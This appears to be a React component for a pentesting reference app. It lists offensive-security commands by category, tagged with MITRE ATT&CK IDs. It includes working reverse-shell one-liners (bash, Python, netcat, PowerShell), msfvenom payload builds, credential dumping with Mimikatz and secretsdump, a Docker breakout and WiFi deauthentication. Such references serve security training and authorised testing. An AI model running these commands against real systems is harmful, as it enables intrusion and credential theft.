import React, { useState } from 'react';
import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone, Radio, Cpu, Lock } from 'lucide-react';

interface Command {
  cmd: string;
  desc: string;
  mitre?: string;
}

interface Category {
  id: string;
  name: string;
  icon: React.ReactNode;
  description: string;
  commands: Command[];
}

const cheatSheetData: Category[] = [
  // 1. RECON / OSINT
  {
    id: 'osint',
    name: 'OSINT & Recon',
    icon: <Eye size={18} />,
    description: 'Passive intelligence, user enumeration, and domain mapping.',
    commands: [
      { cmd: 'theHarvester -d <domain> -b all', desc: 'Aggressive email/subdomain harvest.', mitre: 'T1596' },
      { cmd: 'sublist3r -d <domain> -t 20', desc: 'Fast subdomain enumeration.', mitre: 'T1596' },
      { cmd: 'amass enum -d <domain> -active', desc: 'Active subdomain mapping (ASN/CIDR).', mitre: 'T1596' },
      { cmd: 'sherlock <username>', desc: 'Find username across social networks.', mitre: 'T1593' },
      { cmd: 'ghunt email <email>', desc: 'Extract Google Account details.', mitre: 'T1593' },
      { cmd: 'shodan host <ip>', desc: 'Retrieve host details from Shodan.', mitre: 'T1596' },
      { cmd: 'dig axfr @<ns> <domain>', desc: 'Attempt DNS Zone Transfer.', mitre: 'T1596' },
      { cmd: 'whois <domain>', desc: 'Get registrar and registration info.', mitre: 'T1596' },
      { cmd: 'dnsrecon -d <domain>', desc: 'Comprehensive DNS enumeration.', mitre: 'T1596' }
    ]
  },
  // 2. NETWORK SCANNING (Advanced)
  {
    id: 'nmap',
    name: 'Advanced Nmap',
    icon: <Search size={18} />,
    description: 'Evasion techniques, aggressive detection, and scripting.',
    commands: [
      { cmd: 'nmap -f -mtu 24 -D RND:10 <ip>', desc: 'Evasion: Fragmentation + Decoys.', mitre: 'T1046' },
      { cmd: 'nmap -O --osscan-guess <ip>', desc: 'Aggressive OS Detection.', mitre: 'T1046' },
      { cmd: 'nmap -sV --version-intensity 9 <ip>', desc: 'Max Version Intensity.', mitre: 'T1046' },
      { cmd: 'nmap --script "vuln and safe" <ip>', desc: 'Run safe vulnerability scripts.', mitre: 'T1595' },
      { cmd: 'nmap -sS -p- --min-rate 5000 <ip>', desc: 'High-speed full port SYN scan.', mitre: 'T1046' },
      { cmd: 'nmap -sU --top-ports 100 <ip>', desc: 'UDP scan top 100 ports.', mitre: 'T1046' },
      { cmd: 'nmap --script smb-os-discovery <ip>', desc: 'Enumerate SMB OS info.', mitre: 'T1046' },
      { cmd: 'netdiscover -r <ip>/24', desc: 'Passive/Active ARP reconnaissance.', mitre: 'T1046' }
    ]
  },
  // 3. WEB EXPLOITATION
  {
    id: 'web',
    name: 'Web Exploitation',
    icon: <Globe size={18} />,
    description: 'SQLi, XSS, Fuzzing, and CMS attacks.',
    commands: [
      { cmd: 'gobuster dir -u <url> -w list.txt -x php,txt', desc: 'Directory brute-force.', mitre: 'T1595' },
      { cmd: 'ffuf -u <url>/FUZZ -w list.txt -mc 200,301', desc: 'Fast web fuzzer.', mitre: 'T1595' },
      { cmd: 'sqlmap -u "<url>" --batch --dbs', desc: 'Auto SQL Injection.', mitre: 'T1190' },
      { cmd: 'sqlmap -r req.txt --level 5 --risk 3', desc: 'SQLi from saved request.', mitre: 'T1190' },
      { cmd: 'nikto -h <url>', desc: 'Web server vulnerability scanner.', mitre: 'T1595' },
      { cmd: 'wpscan --url <url> -e p,u', desc: 'WordPress plugin/user enum.', mitre: 'T1595' },
      { cmd: 'hydra -l user -P pass.txt <url> http-post-form', desc: 'Brute force login form.', mitre: 'T1110' },
      { cmd: 'xsstrike -u "<url>"', desc: 'XSS Detection suite.', mitre: 'T1059' },
      { cmd: 'cewl -d 2 -w dict.txt <url>', desc: 'Scrape words for passwords.', mitre: 'T1056' }
    ]
  },
  // 4. API SECURITY
  {
    id: 'api',
    name: 'API Security',
    icon: <FileCode size={18} />,
    description: 'Endpoint discovery, JWT analysis, and parameter fuzzing.',
    commands: [
      { cmd: 'kr scan <target> -w routes.json', desc: 'Kiterunner: API endpoint discovery.', mitre: 'T1595' },
      { cmd: 'arjun -u <url> --get', desc: 'Arjun: Hidden parameter discovery.', mitre: 'T1595' },
      { cmd: 'ffuf -w words.txt -u <url> -H "Content-Type: application/json" -d \'{"key": "FUZZ"}\'', desc: 'Fuzz JSON POST bodies.', mitre: 'T1190' },
      { cmd: 'python3 jwt_tool.py <token> -T', desc: 'JWT tampering and analysis.', mitre: 'T1552' },
      { cmd: 'zap-cli quick-scan -s xss,sqli <url>', desc: 'OWASP ZAP Quick Scan.', mitre: 'T1595' }
    ]
  },
  // 5. MOBILE SECURITY
  {
    id: 'mobile',
    name: 'Mobile Security',
    icon: <Smartphone size={18} />,
    description: 'Android/iOS assessment with Frida and Objection.',
    commands: [
      { cmd: 'frida -U -f <pkg> -l root_bypass.js', desc: 'Frida: Bypass root detection.', mitre: 'T1626' },
      { cmd: 'objection --gadget <pkg> explore', desc: 'Objection: Runtime exploration.', mitre: 'T1626' },
      { cmd: 'android sslpinning disable', desc: 'Objection: Disable SSL Pinning.', mitre: 'T1573' },
      { cmd: 'adb shell pm list packages', desc: 'List installed packages (ADB).', mitre: 'T1082' },
      { cmd: 'jadx-gui <apk>', desc: 'Static analysis of APK.', mitre: 'T1082' }
    ]
  },
  // 6. WIRELESS SECURITY (New)
  {
    id: 'wireless',
    name: 'Wireless Security',
    icon: <Wifi size={18} />,
    description: 'WiFi auditing and monitoring.',
    commands: [
      { cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode.', mitre: 'T1040' },
      { cmd: 'airodump-ng wlan0mon', desc: 'Capture WiFi traffic.', mitre: 'T1040' },
      { cmd: 'aireplay-ng --deauth 10 -a <bssid> wlan0mon', desc: 'Deauth attack (Handshake capture).', mitre: 'T1040' },
      { cmd: 'aircrack-ng -w list.txt cap.cap', desc: 'Crack WPA handshake.', mitre: 'T1110' },
      { cmd: 'wifite --kill', desc: 'Automated WiFi auditor.', mitre: 'T1040' },
      { cmd: 'kismet -c wlan0mon', desc: 'Passive wireless sniffer.', mitre: 'T1040' }
    ]
  },
  // 7. EXPLOIT & VULNS
  {
    id: 'exploit',
    name: 'Exploits & Vulns',
    icon: <Zap size={18} />,
    description: 'Vulnerability scanning and exploit frameworks.',
    commands: [
      { cmd: 'nuclei -u <target> -t cves/ -s critical', desc: 'Nuclei: Scan for critical CVEs.', mitre: 'T1595' },
      { cmd: 'searchsploit "Apache 2.4"', desc: 'Exploit-DB: Search for exploits.', mitre: 'T1596' },
      { cmd: 'searchsploit -m <id>', desc: 'Mirror exploit to current dir.', mitre: 'T1596' },
      { cmd: 'msfconsole -q -x "use exploit/multi/handler; set LHOST <ip>; run"', desc: 'Metasploit: Quick Listener.', mitre: 'T1059' },
      { cmd: 'msfvenom -p android/meterpreter/reverse_tcp ...', desc: 'Generate Android Payload.', mitre: 'T1059' }
    ]
  },
  // 8. SHELLS & PAYLOADS
  {
    id: 'shells',
    name: 'Shells & Payloads',
    icon: <Terminal size={18} />,
    description: 'Reverse shells and payload generation.',
    commands: [
      { cmd: 'bash -i >& /dev/tcp/<ip>/<port> 0>&1', desc: 'Bash Reverse Shell.', mitre: 'T1059' },
      { cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', desc: 'Python Reverse Shell.', mitre: 'T1059' },
      { cmd: 'nc -e /bin/sh <ip> <port>', desc: 'Netcat (Traditional).', mitre: 'T1059' },
      { cmd: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'<ip>\',<port>);..."', desc: 'PowerShell Reverse Shell.', mitre: 'T1059' },
      { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe', desc: 'Meterpreter Payload (Windows).', mitre: 'T1059' },
      { cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf', desc: 'Reverse Shell (Linux).', mitre: 'T1059' },
      { cmd: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php', desc: 'PHP Reverse Shell.', mitre: 'T1059' }
    ]
  },
  // 9. REVERSE ENGINEERING (New)
  {
    id: 'reverse',
    name: 'Reverse Engineering',
    icon: <Cpu size={18} />,
    description: 'Binary analysis and debugging.',
    commands: [
      { cmd: 'strings <binary> | grep -i "pass"', desc: 'Extract readable strings.', mitre: 'T1082' },
      { cmd: 'objdump -d <binary>', desc: 'Disassemble binary.', mitre: 'T1082' },
      { cmd: 'strace <binary>', desc: 'Trace system calls.', mitre: 'T1082' },
      { cmd: 'ltrace <binary>', desc: 'Trace library calls.', mitre: 'T1082' },
      { cmd: 'radare2 -d <binary>', desc: 'Advanced CLI debugger.', mitre: 'T1082' },
      { cmd: 'ghidra', desc: 'NSA Reverse Engineering Suite.', mitre: 'T1082' },
      { cmd: 'gdb -q <binary>', desc: 'GNU Debugger.', mitre: 'T1082' }
    ]
  },
  // 10. PRIV ESCALATION (LINUX)
  {
    id: 'privesc_linux',
    name: 'PrivEsc (Linux)',
    icon: <Unlock size={18} />,
    description: 'Linux local privilege escalation.',
    commands: [
      { cmd: 'sudo -l', desc: 'Check sudo rights.', mitre: 'T1548' },
      { cmd: 'find / -perm -u=s -type f 2>/dev/null', desc: 'Find SUID binaries.', mitre: 'T1548' },
      { cmd: 'getcap -r / 2>/dev/null', desc: 'Check file capabilities.', mitre: 'T1548' },
      { cmd: 'cat /etc/crontab', desc: 'Check cron jobs.', mitre: 'T1053' },
      { cmd: 'linpeas.sh', desc: 'Automated Enumeration Script.', mitre: 'T1082' }
    ]
  },
  // 11. PRIV ESCALATION (WINDOWS)
  {
    id: 'privesc_windows',
    name: 'PrivEsc (Windows)',
    icon: <Server size={18} />,
    description: 'Windows local privilege escalation.',
    commands: [
      { cmd: 'whoami /priv', desc: 'Check tokens (SeImpersonate).', mitre: 'T1134' },
      { cmd: 'cmdkey /list', desc: 'Stored credentials.', mitre: 'T1552' },
      { cmd: 'wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"', desc: 'Unquoted Service Paths.', mitre: 'T1574' },
      { cmd: 'winPEAS.exe', desc: 'Automated Enum Script.', mitre: 'T1082' }
    ]
  },
  // 12. ACTIVE DIRECTORY
  {
    id: 'ad',
    name: 'Active Directory',
    icon: <Network size={18} />,
    description: 'Domain enumeration and attacks.',
    commands: [
      { cmd: 'net user /domain', desc: 'List domain users.', mitre: 'T1087' },
      { cmd: 'Get-ADUser -Filter *', desc: 'PowerShell User Enum.', mitre: 'T1087' },
      { cmd: 'Invoke-Mimikatz -DumpCreds', desc: 'Dump memory creds.', mitre: 'T1003' },
      { cmd: 'bloodhound-python -d <domain> -u <user> -p <pass> -c All', desc: 'Bloodhound Ingest.', mitre: 'T1087' },
      { cmd: 'impacket-psexec <domain>/<user>:<pass>@<ip>', desc: 'PsExec Lateral Move.', mitre: 'T1021' },
      { cmd: 'impacket-secretsdump <domain>/<user>:<pass>@<ip>', desc: 'DCSync / Hashdump.', mitre: 'T1003' },
      { cmd: 'kerbrute userenum -d <domain> users.txt', desc: 'Kerberos User Enum.', mitre: 'T1589' }
    ]
  },
  // 13. FILE TRANSFER
  {
    id: 'file_transfer',
    name: 'File Transfer',
    icon: <Share2 size={18} />,
    description: 'Ingress and egress of tools/data.',
    commands: [
      { cmd: 'python3 -m http.server 80', desc: 'Python HTTP Server.', mitre: 'T1105' },
      { cmd: 'wget http://<ip>/file -O file', desc: 'Wget download.', mitre: 'T1105' },
      { cmd: 'certutil -urlcache -split -f http://<ip>/file file.exe', desc: 'Windows CertUtil.', mitre: 'T1105' },
      { cmd: 'impacket-smbserver share . -smb2support', desc: 'SMB Server.', mitre: 'T1040' }
    ]
  },
  // 14. PIVOTING & TUNNELING
  {
    id: 'pivoting',
    name: 'Pivoting',
    icon: <Layers size={18} />,
    description: 'Network tunneling and port forwarding.',
    commands: [
      { cmd: 'ssh -D 9050 user@<ip>', desc: 'Dynamic SOCKS Proxy.', mitre: 'T1090' },
      { cmd: 'chisel server -p 8000 --reverse', desc: 'Chisel Server.', mitre: 'T1090' },
      { cmd: 'chisel client <ip>:8000 R:80:127.0.0.1:80', desc: 'Chisel Client Reverse.', mitre: 'T1090' },
      { cmd: 'ligolo-ng', desc: 'Advanced Tunneling Interface.', mitre: 'T1090' },
      { cmd: 'proxychains nmap ...', desc: 'Route tool via proxy.', mitre: 'T1090' }
    ]
  },
  // 15. CLOUD & CONTAINER
  {
    id: 'cloud',
    name: 'Cloud & Docker',
    icon: <CloudLightning size={18} />,
    description: 'AWS, Docker, and Kubernetes exploitation.',
    commands: [
      { cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', desc: 'Docker Breakout (Mount Root).', mitre: 'T1611' },
      { cmd: 'curl http://169.254.169.254/latest/meta-data/', desc: 'AWS Metadata.', mitre: 'T1552' },
      { cmd: 'kubectl auth can-i --list', desc: 'Check K8s Permissions.', mitre: 'T1613' },
      { cmd: 'peirates', desc: 'K8s Pentest Tool.', mitre: 'T1613' }
    ]
  },
  // 16. FORENSICS & BLUE TEAM
  {
    id: 'forensics',
    name: 'Forensics & Blue',
    icon: <HardDrive size={18} />,
    description: 'Incident response and analysis.',
    commands: [
      { cmd: 'volatility -f mem.dmp imageinfo', desc: 'Volatility Image Info.', mitre: 'T1005' },
      { cmd: 'volatility -f mem.dmp pslist', desc: 'List Processes (Mem).', mitre: 'T1057' },
      { cmd: 'binwalk -e <file>', desc: 'Extract firmware/files.', mitre: 'T1140' },
      { cmd: 'Get-WinEvent -LogName Security', desc: 'Read Windows Event Logs.', mitre: 'T1005' },
      { cmd: 'wireshark <pcap>', desc: 'Packet Analysis.', mitre: 'T1040' }
    ]
  }
];

const CheatSheetView: React.FC = () => {
  const [activeCategory, setActiveCategory] = useState<string>(cheatSheetData[0].id);
  const [copiedIndex, setCopiedIndex] = useState<string | null>(null);

  const activeData = cheatSheetData.find(c => c.id === activeCategory);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(id);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  return (
    <div className="h-full flex flex-col md:flex-row p-6 max-w-7xl mx-auto w-full gap-6 overflow-hidden">
      
      {/* Sidebar / Category List */}
      <div className="w-full md:w-64 flex flex-col gap-2 flex-shrink-0 bg-slate-900/50 rounded-xl p-2 border border-slate-800 h-full overflow-y-auto">
        <div className="p-2 mb-2">
          <h1 className="text-2xl font-bold text-emerald-400 flex items-center gap-3">
            <BookOpen className="w-8 h-8" />
            Library
          </h1>
          <p className="text-slate-400 text-sm mt-1">Master Reference</p>
        </div>
        
        <div className="flex flex-col gap-1">
          {cheatSheetData.map(cat => (
            <button
              key={cat.id}
              onClick={() => setActiveCategory(cat.id)}
              className={`flex items-center gap-3 p-3 rounded-lg transition-all text-sm font-medium whitespace-nowrap text-left ${
                activeCategory === cat.id
                  ? 'bg-emerald-900/30 text-emerald-400 border border-emerald-800/50 shadow-md'
                  : 'text-slate-400 hover:bg-slate-800 hover:text-slate-200 border border-transparent'
              }`}
            >
              <span className={activeCategory === cat.id ? 'text-emerald-400' : 'text-slate-500'}>
                {cat.icon}
              </span>
              <span className="flex-1">{cat.name}</span>
              {activeCategory === cat.id && <ChevronRight size={14} className="ml-auto opacity-70" />}
            </button>
          ))}
        </div>
        
        <div className="mt-auto pt-4 px-2">
           <div className="text-[10px] text-slate-600 uppercase tracking-wider font-semibold text-center border-t border-slate-800 pt-2">
             Educational Use Only
           </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 bg-slate-900 border border-slate-800 rounded-xl shadow-lg flex flex-col overflow-hidden">
        {activeData && (
          <>
            <div className="p-6 border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
              <div className="flex items-center gap-3 mb-2">
                <div className="p-2 bg-emerald-900/20 rounded-lg text-emerald-400 border border-emerald-900/30">
                  {activeData.icon}
                </div>
                <h2 className="text-xl font-bold text-slate-100">{activeData.name}</h2>
              </div>
              <p className="text-slate-400 text-sm">{activeData.description}</p>
            </div>

            <div className="overflow-y-auto p-6 space-y-4">
              {activeData.commands.map((item, idx) => {
                const uniqueId = `${activeCategory}-${idx}`;
                return (
                  <div key={idx} className="group bg-slate-950/50 border border-slate-800 rounded-lg p-4 hover:border-emerald-500/30 transition-all shadow-sm hover:shadow-md">
                    <div className="flex justify-between items-start gap-4">
                      <div className="flex-1 font-mono text-sm text-cyan-300 break-all leading-relaxed">
                        <span className="select-all">{item.cmd}</span>
                      </div>
                      <button
                        onClick={() => handleCopy(item.cmd, uniqueId)}
                        className={`transition-all p-2 rounded-md ${copiedIndex === uniqueId ? 'bg-emerald-900/50 text-emerald-400' : 'text-slate-500 hover:text-emerald-400 hover:bg-slate-900'}`}
                        title="Copy command"
                      >
                        {copiedIndex === uniqueId ? <Check size={16} /> : <Copy size={16} />}
                      </button>
                    </div>
                    <div className="mt-3 text-xs text-slate-400 border-t border-slate-800/50 pt-2 flex items-start gap-2">
                      <Shield size={12} className="text-emerald-600 mt-0.5 flex-shrink-0" />
                      <span className="flex-1">{item.desc}</span>
                      {item.mitre && (
                         <a 
                           href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}`} 
                           target="_blank" 
                           rel="noopener noreferrer"
                           className="flex-shrink-0 bg-slate-900 text-slate-500 hover:text-emerald-400 px-1.5 py-0.5 rounded border border-slate-800 font-mono text-[10px] transition-colors"
                           title="View MITRE ATT&CK Technique"
                         >
                           {item.mitre}
                         </a>
                      )}
                    </div>
                  </div>
                );
              })}
              
              <div className="mt-8 p-4 bg-slate-950 border border-red-900/30 rounded-lg flex gap-3 shadow-inner">
                <Shield className="text-red-400/80 flex-shrink-0" size={20} />
                <div className="text-xs text-slate-400 leading-relaxed">
                  <strong className="text-red-400 block mb-1">ETHICAL DISCLAIMER</strong>
                  These commands are provided strictly for educational purposes and authorized security testing. 
                  Deploying these tools against systems without explicit permission is illegal and unethical. 
                  Always practice in a controlled lab environment (e.g., local VMs, Hack The Box, TryHackMe).
                </div>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default CheatSheetView;